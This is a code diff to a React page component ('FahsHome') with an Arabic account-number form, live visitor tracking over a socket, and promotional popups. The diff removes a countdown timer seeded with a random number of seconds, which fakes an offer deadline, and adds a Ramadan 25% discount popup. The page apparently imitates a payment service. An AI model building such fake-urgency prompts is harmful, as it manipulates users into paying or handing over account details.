@@ -7,14 +7,6 @@ export default function FahsHome() {
   const [isLoading, setIsLoading] = useState(false);
   const [, setLocation] = useLocation();
   const [showPopup, setShowPopup] = useState(false);
-  const [countdown, setCountdown] = useState(() => {
-    const maxSeconds = 11 * 3600 + 47 * 60 + 4;
-    const randomTotal = Math.floor(Math.random() * maxSeconds) + 1;
-    const h = Math.floor(randomTotal / 3600);
-    const m = Math.floor((randomTotal % 3600) / 60);
-    const s = randomTotal % 60;
-    return { hours: h, minutes: m, seconds: s };
-  });
 
   useEffect(() => {
     socket.value.emit("visitor:pageView", { page: "home", url: window.location.href });
@@ -28,25 +20,7 @@ export default function FahsHome() {
     return () => clearTimeout(popupTimer);
   }, []);
 
-  // Countdown timer
-  useEffect(() => {
-    if (!showPopup) return;
-    const interval = setInterval(() => {
-      setCountdown(prev => {
-        const totalSeconds = prev.hours * 3600 + prev.minutes * 60 + prev.seconds - 1;
-        if (totalSeconds <= 0) {
-          clearInterval(interval);
-          return { hours: 0, minutes: 0, seconds: 0 };
-        }
-        return {
-          hours: Math.floor(totalSeconds / 3600),
-          minutes: Math.floor((totalSeconds % 3600) / 60),
-          seconds: totalSeconds % 60,
-        };
-      });
-    }, 1000);
-    return () => clearInterval(interval);
-  }, [showPopup]);
+
 
   const handleSubmit = () => {
     if (!accountNumber.trim()) return;
@@ -110,25 +84,79 @@ export default function FahsHome() {
         dir="rtl"
         style={{ fontFamily: "'SE', sans-serif" }}
       >
-        {/* Cashback Popup */}
+        {/* Ramadan Popup */}
         {showPopup && (
           <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50" onClick={() => setShowPopup(false)}>
             <div className="bg-white rounded-2xl shadow-2xl max-w-sm w-[90%] mx-auto overflow-hidden" onClick={(e) => e.stopPropagation()}>
-              <div className="w-full">
-                <img src="/images/cashback-cards.png" alt="كاش باك 30%" className="w-full object-cover" />
+              {/* Ramadan Header with Crescent */}
+              <div style={{
+                background: 'linear-gradient(135deg, #0a1628 0%, #1a3a5c 50%, #0d2137 100%)',
+                padding: '40px 20px',
+                textAlign: 'center',
+                position: 'relative',
+                overflow: 'hidden',
+              }}>
+                {/* Stars decoration */}
+                <div style={{ position: 'absolute', top: '15px', right: '25px', color: '#ffd700', fontSize: '12px', opacity: 0.7 }}>\u2726</div>
+                <div style={{ position: 'absolute', top: '35px', right: '60px', color: '#ffd700', fontSize: '8px', opacity: 0.5 }}>\u2726</div>
+                <div style={{ position: 'absolute', top: '20px', left: '30px', color: '#ffd700', fontSize: '10px', opacity: 0.6 }}>\u2726</div>
+                <div style={{ position: 'absolute', top: '50px', left: '55px', color: '#ffd700', fontSize: '7px', opacity: 0.4 }}>\u2726</div>
+                <div style={{ position: 'absolute', bottom: '25px', right: '40px', color: '#ffd700', fontSize: '9px', opacity: 0.5 }}>\u2726</div>
+                <div style={{ position: 'absolute', bottom: '20px', left: '35px', color: '#ffd700', fontSize: '11px', opacity: 0.6 }}>\u2726</div>
+                {/* Crescent Moon */}
+                <div style={{ fontSize: '70px', marginBottom: '10px', filter: 'drop-shadow(0 0 15px rgba(255,215,0,0.4))' }}>
+                  \ud83c\udf19
+                </div>
+                <h2 style={{
+                  fontFamily: "'SE', sans-serif",
+                  fontSize: '28px',
+                  fontWeight: 700,
+                  color: '#ffd700',
+                  marginBottom: '5px',
+                  textShadow: '0 2px 10px rgba(255,215,0,0.3)',
+                }}>\u0631\u0645\u0636\u0627\u0646 \u0643\u0631\u064a\u0645</h2>
               </div>
               <div className="p-6 text-center">
-                <h3 className="text-2xl font-bold text-gray-900 mb-2">سارع قبل نهاية العرض!</h3>
-                <p className="text-gray-500 mb-4">يتبقى على إنتهاء العرض</p>
-                <div className="text-4xl font-bold mb-6" dir="ltr" style={{ color: '#06c' }}>
-                  {String(countdown.hours).padStart(2, '0')}:{String(countdown.minutes).padStart(2, '0')}:{String(countdown.seconds).padStart(2, '0')}
+                <h3 style={{
+                  fontFamily: "'SE', sans-serif",
+                  fontSize: '22px',
+                  fontWeight: 600,
+                  color: '#001f5e',
+                  marginBottom: '12px',
+                }}>\u0628\u0645\u0646\u0627\u0633\u0628\u0629 \u0627\u0644\u0634\u0647\u0631 \u0627\u0644\u0641\u0636\u064a\u0644</h3>
+                <div style={{
+                  background: 'linear-gradient(135deg, #06c, #0055aa)',
+                  borderRadius: '12px',
+                  padding: '16px 20px',
+                  marginBottom: '16px',
+                }}>
+                  <p style={{
+                    fontFamily: "'SE', sans-serif",
+                    fontSize: '20px',
+                    fontWeight: 700,
+                    color: '#fff',
+                  }}>\u062e\u0635\u0645 25%</p>
+                  <p style={{
+                    fontFamily: "'SE', sans-serif",
+                    fontSize: '15px',
+                    fontWeight: 400,
+                    color: '#e0ecff',
+                    marginTop: '4px',
+                  }}>\u0639\u0646\u062f \u062f\u0641\u0639 \u0643\u0627\u0645\u0644 \u0627\u0644\u0645\u0628\u0644\u063a</p>
                 </div>
+                <p style={{
+                  fontFamily: "'SE', sans-serif",
+                  fontSize: '15px',
+                  fontWeight: 400,
+                  color: '#66799e',
+                  marginBottom: '20px',
+                }}>\u0644\u0622\u062e\u0631 \u064a\u0648\u0645 \u0645\u0646 \u0623\u064a\u0627\u0645 \u0627\u0644\u0634\u0647\u0631 \u0627\u0644\u0641\u0636\u064a\u0644</p>
                 <button
                   onClick={() => setShowPopup(false)}
                   className="w-3/4 py-3 text-white rounded-lg font-bold text-lg transition-colors"
                   style={{ backgroundColor: '#06c' }}
                 >
-                  إغلاق
+                  \u0625\u063a\u0644\u0627\u0642
                 </button>
               </div>
             </div>
